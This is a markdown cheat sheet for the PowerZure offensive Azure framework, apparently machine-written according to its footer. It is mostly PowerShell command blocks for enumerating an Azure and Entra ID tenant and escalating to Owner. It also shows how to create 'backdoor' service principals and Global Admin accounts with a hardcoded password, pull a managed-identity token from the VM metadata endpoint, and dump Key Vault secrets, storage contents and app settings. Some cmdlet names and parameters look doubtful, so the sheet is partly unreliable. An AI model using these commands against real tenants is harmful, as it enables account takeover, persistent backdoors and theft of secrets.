# PowerZure

**Tags:** `#powerzure` `#azure` `#cloud` `#powershell` `#enumeration` `#postexploitation` `#privesc` `#persistence`

PowerShell offensive Azure framework for post-exploitation after gaining Azure credentials. Covers enumeration, privilege escalation, persistence, lateral movement, and data exfiltration across Azure and Entra ID. More structured workflow than MicroBurst — designed to walk through an engagement step by step.

**Source:** https://github.com/hausec/PowerZure
**Install:**
```powershell
git clone https://github.com/hausec/PowerZure
Import-Module .\PowerZure.ps1

# Requires Az + AzureAD modules
Install-Module Az -Scope CurrentUser
Connect-AzAccount
```

> [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has more structured workflow and covers more Entra ID attack paths. MicroBurst has better credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.

---

## Initial Recon

```powershell
# Who am I, what subscriptions do I have access to?
Show-AzCurrentUser
Get-AzSubscriptions

# Set target subscription
Set-AzSubscription -Id <sub-id>

# Full environment overview
Get-AzTargets
# Returns: VMs, web apps, storage, Key Vaults, service principals, role assignments
```

---

## User & Role Enumeration

```powershell
# All users in the tenant
Get-AzUsers
Get-AzUsers -User <upn>

# All groups and members
Get-AzGroups
Get-AzGroupMembers -Group "Global Administrators"

# Role assignments — who has what
Get-AzRoleAssignments
Get-AzRoleAssignments -User <upn>

# Service principals + permissions
Get-AzServicePrincipals
Get-AzServicePrincipalPermissions -ServicePrincipal <name>

# App registrations
Get-AzApps
Get-AzAppOwners -App <name>
```

---

## Resource Enumeration

```powershell
# All resources
Get-AzResources

# VMs
Get-AzVMs
Get-AzVMDetails -VM <name>

# Storage accounts
Get-AzStorageAccounts

# Key Vaults + secrets
Get-AzKeyVaults
Get-AzKeyVaultSecrets -Vault <name>
Get-AzKeyVaultKeys -Vault <name>

# App Services + Function Apps
Get-AzWebApps
Get-AzFunctionApps

# Logic Apps (connections often contain credentials)
Get-AzLogicApps

# Automation Accounts
Get-AzAutomationAccounts
Get-AzAutomationCredentials -Account <name>

# SQL
Get-AzSQLServers
Get-AzSQLDatabases -Server <name>

# Network + public IPs
Get-AzNetworkConfig
Get-AzPublicIPs
```

---

## Privilege Escalation

```powershell
# Check current permissions
Get-AzPermissions

# Add role assignment (requires Microsoft.Authorization/roleAssignments/write)
Set-AzRole -Role "Owner" -User <upn> -Scope "/subscriptions/<sub-id>"

# Create new backdoor SP with Owner role
New-AzBackdoor -Username backdoor -Password 'P@ssw0rd123!' -Role Owner

# VM command execution (requires VM Contributor or higher)
Invoke-AzVMCommand -VM <name> -ResourceGroup <rg> -Command 'whoami /all'

# Get managed identity token from inside a VM (run on target VM)
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Persistence

```powershell
# Add secret to existing app registration
Add-AzADAppSecret -App <name>

# Create new Global Admin user
New-AzUser -Username backdoor@company.com -Password 'P@ssw0rd123!' -Role GlobalAdmin

# Add service principal with Owner role
New-AzBackdoor -Username sp-backdoor -Password 'P@ssw0rd123!' -Role Owner -ServicePrincipal

# Add to privileged group
Add-AzGroupMember -Group "Global Administrators" -User <upn>
```

---

## Data Exfiltration

```powershell
# All Key Vault secrets
Get-AzKeyVaultSecrets -All

# Storage blobs
Get-AzStorageContents -StorageAccount <name>

# Automation runbooks (may contain credentials in plaintext)
Get-AzRunbooks -Account <name>

# App Service + Function App environment variables
Get-AzAppSettings -App <name>
Get-AzFunctionSettings -App <name>
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
